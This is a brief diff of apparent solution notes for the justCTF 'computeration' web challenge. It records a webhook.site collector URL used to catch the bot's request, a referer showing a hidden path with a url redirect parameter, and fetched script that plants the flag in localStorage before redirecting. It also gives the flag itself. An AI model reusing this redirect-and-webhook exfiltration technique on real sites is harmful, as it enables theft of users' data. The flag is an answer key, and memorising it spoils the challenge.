@@ -1,0 +1,17 @@
+https://computeration.web.jctf.pro/report
+	https://webhook.site/fc58cebf-1336-412a-bb17-d5039edb3a86
+
+Get request with
+	referer	https://computeration.web.jctf.pro/b811667a5a09db734093a974111d750e?url=https%3A%2F%2Fwebhook.site%2Ffc58cebf-1336-412a-bb17-d5039edb3a86
+
+curl https://computeration.web.jctf.pro/b811667a5a09db734093a974111d750e
+	<script>
+
+    localStorage.setItem('notes',JSON.stringify([{
+        title:'flag',
+        content:'justCTF{cross_origin_timing_lol}'
+    }]));
+
+    location = (new URL(location.href)).searchParams.get('url');
+
+    </script>
